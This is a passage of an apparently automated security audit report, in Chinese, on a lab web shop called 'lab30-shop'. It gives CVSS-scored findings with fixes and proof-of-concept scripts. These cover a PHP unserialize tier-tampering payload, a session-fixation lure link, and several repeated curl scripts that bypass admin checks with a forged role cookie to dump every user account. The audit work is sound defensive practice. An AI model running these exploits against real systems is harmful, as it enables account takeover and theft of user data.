  保护：仅有 check_csrf()（需有效会话与 token）和 instanceof MemberBackup 类型检查，未做签名/HMAC 校验、白名单 allowed_classes 或属性值校验，无法阻止 tier 被改成任意值
  前提：['攻击者持有效登录会话与 CSRF token（注册即可获得）；无需特权账号']
  修复建议：不要对用户提交数据调用 unserialize；改用 json_decode 并严格校验 tier 属于白名单枚举值、display_name 长度/字符集；如需签名备份，使用 HMAC 且服务端保存密钥。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：db35a73a71c34f5f9ebd6462a6f0856e
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-28T10:34:42.024169+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | account/backup.php 为公网可访问 Web 端点 | lab30-shop/app/public/account/backup.php:1-8 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 只需提交自构造的 base64 序列化字符串并带 CSRF token | lab30-shop/app/public/account/backup.php:4-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | require_user() 要求先登录，注册即可 | lab30-shop/app/public/account/backup.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 攻击者仅操作自身会话，无需他人交互 | lab30-shop/app/public/account/backup.php:3-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 影响局限于本应用的用户资料状态 | lab30-shop/app/public/account/backup.php:6-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | N | 未发现读取他人数据的路径 | lab30-shop/app/public/account/backup.php:6-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | L | 可修改自身 tier/display_name，改变会员权益状态 | lab30-shop/app/src/backup.php:2-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 无可用性影响证据 | lab30-shop/app/public/account/backup.php:6-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'backup_tier_poc.py', 'language': 'python', 'script': 'import base64, re, sys, urllib.request, urllib.parse, http.cookiejar\n\nBASE = sys.argv[1] if len(sys.argv) > 1 else \'http://localhost:8080\'\nUSER = sys.argv[2] if len(sys.argv) > 2 else \'alice\'\nPWD  = sys.argv[3] if len(sys.argv) > 3 else \'alice123\'\n\ncj = http.cookiejar.CookieJar()\nop = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))\n\n# 1) 登录\nop.open(BASE + \'/auth/login.php\', urllib.parse.urlencode({\'username\': USER, \'password\': PWD}).encode())\n\n# 2) 取 CSRF token（backup 页面内嵌 csrf_field）\npage = op.open(BASE + \'/account/backup.php\').read().decode(\'utf-8\', \'replace\')\nm = re.search(r\'name="csrf" value="([0-9a-f]+)"\', page)\ntoken = m.group(1)\n\n# 3) 构造序列化负载：MemberBackup{tier=gold, displayName=...}\npayload = \'O:12:"MemberBackup":2:{s:4:"tier";s:4:"gold";s:11:"displayName";s:8:"PwnedMe!";}\'\nbody = urllib.parse.urlencode({\'csrf\': token, \'backup\': base64.b64encode(payload.encode()).decode()}).encode()\nprint(op.open(BASE + \'/account/backup.php\', body).status)\n\n# 4) 验证 tier 是否被改成 gold\nme = op.open(BASE + \'/account/me.php\').read().decode(\'utf-8\', \'replace\')\nprint(me)\n', 'instructions': '把 BASE 指向靶场（如 http://localhost:8080），USER/PWD 填任一已注册普通账号；脚本先登录、抓取 /account/backup.php 的 csrf，再提交构造的 base64(PHP serialize) 负载，最后请求 /account/me.php 查看 tier 字段。', 'normal_input': 'backup = base64(PHP serialize(new MemberBackup)) → tier=standard', 'attack_input': 'backup = base64(\'O:12:"MemberBackup":2:{s:4:"tier";s:4:"gold";s:11:"displayName";s:8:"PwnedMe!";}\')', 'expected_result': '/account/me.php 返回的 tier 从 standard 变为 gold、display_name 变为 PwnedMe!，页面 account/index.php 展示金卡会员权益'}
````


### 台账 `1238e51853454071a05eb987efc1b504`

- start_session() 接受外部 sid 且 use_strict_mode=0，login.php 从 $_GET['sid'] 传入导致会话固定（CVSS 3.1 Base 6.8 (medium) · CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N，验证：unverified）
  来源 `1f8f4058950a4f15bf5582f922ad88f5` / 修订 1
  证据：[{'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 11, 'end_line': 19}, {'path': 'lab30-shop/app/public/auth/login.php', 'start_line': 3, 'end_line': 9}]
  结论：bootstrap.php 第13行显式关闭 session.use_strict_mode，第17行只要 $sid 匹配 [a-zA-Z0-9,-]{16,64} 就无条件 session_id($sid) 后 session_start()；auth/login.php:3 直接把 $_GET['sid'] 作为参数传入，第8行登录成功后仅写 $_SESSION['user_id'] 而不调用 session_regenerate_id。因此攻击者可预先构造会话 ID 并诱导受害者通过带 sid 的登录链接登录，随后复用同一 ID 劫持已认证会话。
  输入：GET 参数 sid，由 auth/login.php:3 传入 start_session()
  传播：$_GET['sid'] -> start_session($sid) -> session_id($sid) -> session_start() -> 登录成功后 $_SESSION['user_id']=id（未 regenerate）
  危险操作：使用外部可控 Session ID 建立认证会话，且登录成功不轮换会话标识
  保护：仅正则校验字符集与长度（第17行）；use_strict_mode 被关闭（第13行），cookie 有 httponly/SameSite=Lax（第16行）但不影响 URL 传入 sid 的路径
  前提：['攻击者诱导受害者访问 /auth/login.php?sid=<攻击者已知ID> 并在该会话中完成登录；无需受害者预先登录']
  修复建议：启用 session.use_strict_mode=1，禁止从 URL/GET 接受会话 ID；登录成功与权限变化时调用 session_regenerate_id(true)。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：db35a73a71c34f5f9ebd6462a6f0856e
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-28T10:34:42.025026+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | 通过构造登录链接在网络上投递 | lab30-shop/app/public/auth/login.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | H | 需要受害者通过特定链接登录，并掌握同一 sid 才能复用 | lab30-shop/app/src/bootstrap.php:13-18 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | N | 攻击者无需任何账号即可预置 sid | lab30-shop/app/src/bootstrap.php:17-18 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | R | 必须由受害者在固定会话中完成登录 | lab30-shop/app/public/auth/login.php:3-9 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 以受害者身份在同一应用内操作 | lab30-shop/app/public/auth/login.php:8-8 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | 可读取受害者账户资料、订单、邮箱等 | lab30-shop/app/src/bootstrap.php:20-24 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | H | 可代表受害者执行写操作（如改邮箱、下单） | lab30-shop/app/public/account/settings.php:3-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 无可用性影响证据 | lab30-shop/app/src/bootstrap.php:11-19 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'session_fixation_demo.html', 'language': 'html', 'script': '<!-- 攻击者构造的登录链接：sid 为攻击者预先选定的固定值 -->\n<a href="http://target/auth/login.php?sid=aaaaaaaaaaaaaaaaaaaaaaaa">立即登录领奖</a>\n\n<!-- 受害者登录后，攻击者浏览器直接携带同一 Cookie 复用会话：\n  Cookie: SHOPSESSID=aaaaaaaaaaaaaaaaaaaaaaaa\n  访问 /account/me.php 应返回受害者账号信息。 -->\n', 'instructions': '先让受害者点击带 sid=aaaaaaaaaaaaaaaaaaaaaaaa 的登录链接并完成登录；随后在另一浏览器手动设置 Cookie SHOPSESSID=aaaaaaaaaaaaaaaaaaaaaaaa，请求 /account/me.php。', 'normal_input': '直接访问 /auth/login.php（无 sid 参数）登录', 'attack_input': '访问 /auth/login.php?sid=aaaaaaaaaaaaaaaaaaaaaaaa 登录后复用同一 SHOPSESSID', 'expected_result': '攻击者在未持受害者凭据的情况下通过固定 sid 的 Cookie 读取到受保护页面（/account/me.php 返回受害者信息）'}
````


### 台账 `9a66a667a5f046388568cfa10ff63cfe`

- ops/users.php 以 $_COOKIE['role'] 判定管理员权限，任意登录用户可通过伪造 Cookie 读取全站账户与角色清单（CVSS 3.1 Base 6.5 (medium) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N，验证：unverified）
  来源 `5097d75b70344fe1a218bd51b40aaf18` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/ops/users.php', 'start_line': 2, 'end_line': 5}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 33, 'end_line': 37}]
  结论：ops/users.php 先调用 require_user()（仅要求登录）得到会话用户 $u，随后把权限判定建立在攻击者可控的 Cookie 上：$role=(string)($_COOKIE['role']??$u['role'])。只要发送 Cookie role=admin，$role!=='admin' 的检查即被绕过，普通 customer 账号即可执行第 3 行的全表查询并把 id/username/email/role 输出到页面或 JSON。bootstrap.php 中真正可靠的鉴权原语 require_user(['operator','admin'])（第 33-37 行，基于 users 表 role 字段严格比较）此处未被使用，属于鉴权决策建立在客户端可控数据上的绕过。
  输入：HTTP Cookie 头 role=admin（攻击者完全可控）
  传播：$_COOKIE['role'] -> $role -> if($role!=='admin') 判定 -> db()->query('SELECT id,username,email,role FROM users') -> page/json_response 输出
  危险操作：基于客户端 Cookie 的管理员权限判定，随后导出全站用户与角色清单
  保护：仅 require_user() 要求登录，无会话内角色校验；未使用 require_user(['admin'])
  前提：['攻击者持有任意有效登录会话（注册即可获得）并设置 Cookie role=admin']
  修复建议：移除对 $_COOKIE['role'] 的信任，改用 require_user(['admin']) 让权限判定完全来自服务端 users.role。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：db35a73a71c34f5f9ebd6462a6f0856e
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-28T10:35:10.425114+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | Web 接口经网络访问 | lab30-shop/app/public/ops/users.php:2-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 仅需设置一个 Cookie 值 | lab30-shop/app/public/ops/users.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 需登录会话，注册即可获得 | lab30-shop/app/public/ops/users.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 无需他人参与 | lab30-shop/app/public/ops/users.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 同一应用内权限越权 | lab30-shop/app/public/ops/users.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | 导出所有用户邮箱与角色 | lab30-shop/app/public/ops/users.php:3-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | N | 仅为只读查询 | lab30-shop/app/public/ops/users.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 无可用性影响 | lab30-shop/app/public/ops/users.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'poc_cookie_role_bypass.sh', 'language': 'bash', 'script': "#!/bin/bash\n# 1) 先注册并登录拿到合法会话\ncurl -s -c jar.txt -b jar.txt -X POST http://TARGET/auth/login.php -d 'username=attacker&password=attacker123' -o /dev/null\n# 2) 仅追加 role=admin Cookie（非 admin 的真实账户）\ncurl -s -b jar.txt -H 'Cookie: role=admin' -H 'Accept: application/json' 'http://TARGET/ops/users.php'\n", 'instructions': '替换 TARGET 为靶场地址，先用普通账号完成 /auth/login.php 登录，再带上 Cookie role=admin 请求 /ops/users.php；对照组不带该 Cookie 应返回 403。', 'normal_input': "登录后不带 role Cookie 访问 /ops/users.php（返回 403 '人员管理需要管理员权限'）", 'attack_input': 'Cookie: role=admin 访问 /ops/users.php', 'expected_result': '对照组 403；攻击请求返回包含全部用户 id/username/email/role 的 JSON 或页面表格'}
````

- ops/users.php 从客户端 Cookie['role'] 读取角色做管理员校验，可绕过鉴权枚举全部账户（CVSS 3.1 Base 6.5 (medium) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N，验证：unverified）
  来源 `0cd52d930356424d81336800d849d514` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/ops/users.php', 'start_line': 1, 'end_line': 5}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 23, 'end_line': 24}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 33, 'end_line': 36}]
  结论：ops/users.php:2 先 require_user() 只要求登录，随后 $role=(string)($_COOKIE['role']??$u['role']) 用攻击者可控 Cookie 覆盖服务端角色；设置 Cookie role=admin 即通过 admin 判定，:3-5 查询并输出全部用户 id/username/email/role。任意普通 customer 设置 Cookie 即可读取全站账户清单，属客户端角色信任鉴权绕过。bootstrap.php:23/35 表明角色本应由数据库服务端判定，此处被 Cookie 覆盖。
  输入：HTTP Cookie: role=admin（攻击者自行设置）
  传播：$_COOKIE['role'] -> $role -> if($role!=='admin') 通过 -> db()->query('SELECT id,username,email,role FROM users') -> 输出/JSON 返回
  危险操作：越权执行管理员查询并输出全部账户邮箱与角色
  保护：无；require_user() 只校验登录，角色来源被 Cookie 覆盖，未使用服务端 $u['role']
  前提：['攻击者拥有任意普通登录账号（可自行注册 customer）']
  修复建议：删除对 $_COOKIE['role'] 的信任，一律使用服务端 session 对应用户记录的角色判断。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：db35a73a71c34f5f9ebd6462a6f0856e
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-28T10:48:21.694973+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | HTTP Cookie 可远程设置 | lab30-shop/app/public/ops/users.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 只需设置一个 Cookie 值 | lab30-shop/app/public/ops/users.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 需要普通登录账号 | lab30-shop/app/src/bootstrap.php:33-34 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 无其他用户参与 | lab30-shop/app/public/ops/users.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 仍在同一应用内 | lab30-shop/app/public/ops/users.php:2-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | 返回全部用户邮箱与角色 | lab30-shop/app/public/ops/users.php:3-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | N | 只读查询 | lab30-shop/app/public/ops/users.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 无破坏 | lab30-shop/app/public/ops/users.php:3-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'cookie_role_bypass.sh', 'language': 'bash', 'script': "curl -s -b 'SHOPSESSID=<legit_sess>; role=admin' http://TARGET/ops/users.php -H 'Accept: application/json'", 'instructions': '以普通用户登录取得 SHOPSESSID，附加 role=admin Cookie 访问 /ops/users.php，Accept: application/json 便于观察响应。', 'normal_input': '不设置 role Cookie 访问 /ops/users.php', 'attack_input': 'Cookie: role=admin', 'expected_result': '普通用户访问返回 403；附加 role=admin 后返回全部用户 JSON 清单 (access=admin)'}
````

- ops/users.php 以 $_COOKIE['role'] 判定管理员权限，任意登录用户伪造 Cookie 即可越权读取全部账户信息（CVSS 3.1 Base 6.5 (medium) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N，验证：unverified）
  来源 `b55090c15fc946549b30bc6edd7694bd` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/ops/users.php', 'start_line': 1, 'end_line': 5}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 33, 'end_line': 37}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 20, 'end_line': 25}]
  结论：ops/users.php 第 2 行调用 require_user() 且未传角色白名单，bootstrap.php:33-37 在 $roles 为空时只校验登录、不做角色判断并返回 $u；同一行随后执行 $role=(string)($_COOKIE['role']??$u['role'])，用任意可控 Cookie 覆盖数据库角色，并以 $role!=='admin' 作为唯一授权判断。第 3 行无条件查询 users 表 id/username/email/role 全量记录，第 4 行在 Accept 含 application/json 时 json_response 返回全部行，第 5 行渲染表格。Cookie 无签名、不与服务端会话角色比对，因此任何持有 customer 会话的攻击者附加 Cookie: role=admin 即可绕过管理员边界读取全部账户信息。
  输入：HTTP Cookie 头 role，攻击者在自己的已认证请求中任意设置
  传播：ops/users.php:2 $_COOKIE['role'] -> $role -> 与 'admin' 比较通过 -> ops/users.php:3 db()->query 全量用户查询 -> ops/users.php:4 json_response 或 :5 表格输出
  危险操作：以客户端可伪造 Cookie 作为管理员授权依据，并返回全部用户用户名、邮箱、角色
  保护：require_user() 未传 ['admin'] 白名单，bootstrap.php:35 的 in_array(...,$roles,true) 因 $roles 为空被跳过；Cookie 无签名或服务端绑定；页面无二次校验
  前提：['攻击者自注册 customer 账号并登录获得会话（register.php:4-8 开放注册，login.php:5-11 允许登录）']
  修复建议：删除对 $_COOKIE['role'] 的信任，改用 require_user(['admin']) 由服务端会话角色授权；运营类页面统一走角色白名单校验，不读取客户端提交的角色字段。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：db35a73a71c34f5f9ebd6462a6f0856e
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-28T10:56:16.983384+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | 通过 HTTP 携带 Cookie 即可触发 | lab30-shop/app/public/ops/users.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 只需设置 role=admin，无竞争或猜测 | lab30-shop/app/public/ops/users.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 需要先注册并登录一个普通 customer 账号 | lab30-shop/app/public/auth/register.php:4-8 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 攻击者自行发起请求，无需他人参与 | lab30-shop/app/public/ops/users.php:2-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 影响限于商城应用自身授权与数据读取 | lab30-shop/app/public/ops/users.php:3-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | 返回全量用户 id/username/email/role 敏感账户数据 | lab30-shop/app/public/ops/users.php:3-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | N | 该页面仅读取，无写操作 | lab30-shop/app/public/ops/users.php:3-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 未发现可用性影响 | lab30-shop/app/public/ops/users.php:3-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'poc_ops_users_cookie_authbypass.sh', 'language': 'bash', 'script': "#!/bin/sh\ncurl -s -c ck.txt -b ck.txt -X POST http://TARGET/auth/register.php -d 'username=attacker01&email=a@example.com&password=attacker123'\ncurl -s -c ck.txt -b ck.txt -X POST http://TARGET/auth/login.php -d 'username=attacker01&password=attacker123'\ncurl -s -b ck.txt -b 'role=admin' -H 'Accept: application/json' http://TARGET/ops/users.php\n", 'instructions': "将 TARGET 替换为部署地址；依序注册、登录（Cookie 写 ck.txt），第三条请求附加 Cookie role=admin 访问 /ops/users.php；对照时去掉 -b 'role=admin'。", 'normal_input': '仅用登录后的会话 Cookie 访问 /ops/users.php', 'attack_input': '在已登录会话上附加 Cookie: role=admin 访问 /ops/users.php', 'expected_result': '正常请求返回 403「当前账号没有访问该功能的权限。」；攻击请求返回 {"access":"admin","users":[...]} 或含全部用户名/邮箱/角色的表格'}
````

- ops/users.php 以客户端 Cookie['role'] 判定管理员，任意登录用户可越权枚举全站账户（CVSS 3.1 Base 6.5 (medium) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N，验证：unverified）
  来源 `9dd0d9708f8d45a48d3ad9834db11ccd` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/ops/users.php', 'start_line': 2, 'end_line': 2}, {'path': 'lab30-shop/app/public/ops/users.php', 'start_line': 3, 'end_line': 3}, {'path': 'lab30-shop/app/public/ops/users.php', 'start_line': 4, 'end_line': 4}, {'path': 'lab30-shop/app/public/ops/users.php', 'start_line': 5, 'end_line': 5}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 33, 'end_line': 36}]
  结论：users.php:2 通过 require_user() 取得服务端会话用户 $u 后，用 $role=(string)($_COOKIE['role']??$u['role']) 做管理员判定，攻击者可控 Cookie 优先于服务端角色。任何已登录用户（含自助注册的 customer/operator）只需设置 Cookie role=admin 即通过第2行 if($role!=='admin') 检查，随后第3行执行管理员查询 SELECT id,username,email,role FROM users 并在第4/5行以 JSON 或表格输出全站账户清单与角色。校验对象来自客户端而非 $u['role']，保护不足。
  输入：HTTP Cookie: role
  传播：$_COOKIE['role'] 覆盖 require_user() 返回的 $u['role']，通过管理员判定后驱动第3行全表查询并在第4/5行回显
  危险操作：越权执行 SELECT id,username,email,role FROM users 并输出全站账户邮箱与角色
  保护：仅第2行基于客户端 Cookie 的字符串比较，未再使用服务端 $u['role'] 判定；无 CSRF/二次校验
  前提：['攻击者持有任意有效登录会话（可自助注册 customer）']
  修复建议：管理员判定必须使用服务端会话中的 $u['role']，忽略客户端 Cookie；如需 role Cookie 仅作显示用途。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：db35a73a71c34f5f9ebd6462a6f0856e
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-28T10:56:51.235654+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | 经 HTTP 远程访问 /ops/users.php | lab30-shop/app/public/ops/users.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 仅需设置一个 Cookie 值并访问页面 | lab30-shop/app/public/ops/users.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 需要任一已登录账号，可自助注册 | lab30-shop/app/src/bootstrap.php:34-35 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 无需其他用户交互 | lab30-shop/app/public/ops/users.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 在同一应用权限模型内越权，未改变执行环境 | lab30-shop/app/public/ops/users.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | 泄露全站账户邮箱与角色 | lab30-shop/app/public/ops/users.php:3-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | N | 页面仅读取数据，无写入操作 | lab30-shop/app/public/ops/users.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 无可用性影响 | lab30-shop/app/public/ops/users.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'users_cookie_auth_bypass.sh', 'language': 'bash', 'script': '#!/usr/bin/env bash\n# 前提：已用普通账号登录取得 SHOPSESSID\nBASE="http://target"\nSID="$1"\n# 正常：不带 role Cookie 访问\ncurl -s -H "Cookie: SHOPSESSID=$SID" "$BASE/ops/users.php" -o normal.html -w "normal=%{http_code}\\n"\n# 攻击：伪造 role=admin\ncurl -s -H "Cookie: SHOPSESSID=$SID; role=admin" -H "Accept: application/json" "$BASE/ops/users.php" -o attack.json -w "attack=%{http_code}\\n"\ncat attack.json\n', 'instructions': '用自助注册的普通账号登录拿到 SHOPSESSID，作为参数传给脚本，请求 /ops/users.php；对比不带与带 role=admin Cookie 的响应码与 JSON 输出。', 'normal_input': 'Cookie: SHOPSESSID=<普通用户会话>', 'attack_input': 'Cookie: SHOPSESSID=<普通用户会话>; role=admin', 'expected_result': '正常请求返回 403 权限不足；伪造 Cookie 请求返回 200 且 JSON 含全站用户邮箱与角色清单'}
````

- ops/users.php 以客户端 Cookie['role'] 判定管理员，任意登录用户可越权枚举全站账户（CVSS 3.1 Base 6.5 (medium) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N，验证：unverified）
  来源 `040e43b5908b41bc8d9eb42f2d491429` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/ops/users.php', 'start_line': 1, 'end_line': 5}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 33, 'end_line': 37}]
  结论：users.php:2 调用 require_user() 仅要求登录，再用 (string)($_COOKIE['role'] ?? $u['role']) 覆盖服务端会话角色，攻击者设置 Cookie role=admin 即通过第2行 $role!=='admin' 检查，随后第3行执行 SELECT id,username,email,role FROM users 并在第4/5行输出全部账户用户名、邮箱与角色。授权依据来自客户端可完全控制的 Cookie，属认证/授权边界绕过。
  输入：HTTP Cookie 头中的 role 参数
  传播：users.php:2 读取 $_COOKIE['role'] 赋值给 $role → 与 'admin' 比较通过 → users.php:3 查询 users 全表 → users.php:4/5 输出
  危险操作：越权执行管理员查询并输出全站账户邮箱与角色
  保护：require_user() 未传角色列表故不做角色校验；校验依赖客户端 Cookie，可被任意改写，无服务端角色可信来源
  前提：['攻击者拥有任意有效登录会话（可自助注册 customer 账号）']
  修复建议：移除对 $_COOKIE['role'] 的信任，仅使用 require_user() 返回的服务端会话用户角色并以 require_user(['admin']) 强制管理员。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：db35a73a71c34f5f9ebd6462a6f0856e
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-28T10:57:26.157118+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | 经 HTTP 请求远程利用 | lab30-shop/app/public/ops/users.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 仅需设置 Cookie 即稳定触发 | lab30-shop/app/public/ops/users.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 需已登录的普通账户 | lab30-shop/app/public/ops/users.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 无需其他用户参与 | lab30-shop/app/public/ops/users.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 同一应用授权边界内越权 | lab30-shop/app/public/ops/users.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | 泄露全站账户邮箱与角色 | lab30-shop/app/public/ops/users.php:3-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | N | 仅读取，无写入 | lab30-shop/app/public/ops/users.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 无可用性影响 | lab30-shop/app/public/ops/users.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'poc_users_cookie_role.sh', 'language': 'bash', 'script': "curl -s -b 'SHOPSESSID=<valid_session>; role=admin' -H 'Accept: application/json' 'http://target/ops/users.php'", 'instructions': '使用任意已登录 customer 会话的 SHOPSESSID，附加 Cookie role=admin，请求 /ops/users.php 并带 Accept: application/json。', 'normal_input': 'Cookie 不带 role=admin', 'attack_input': 'Cookie: role=admin', 'expected_result': '普通会话返回 403；伪造 role=admin 后返回 JSON 含全部用户与角色清单'}
````


### 台账 `db40fe1ecfd14b0a82962ee5521ece96`

- catalog/index.php 将 $_GET['q'] 直接拼接进 LIKE 查询（SQL 注入）（CVSS 3.1 Base 7.5 (high) · CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N，验证：unverified）
  来源 `9df61be895d845c19763bbd44c2f269c` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/catalog/index.php', 'start_line': 3, 'end_line': 5}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 4, 'end_line': 8}]
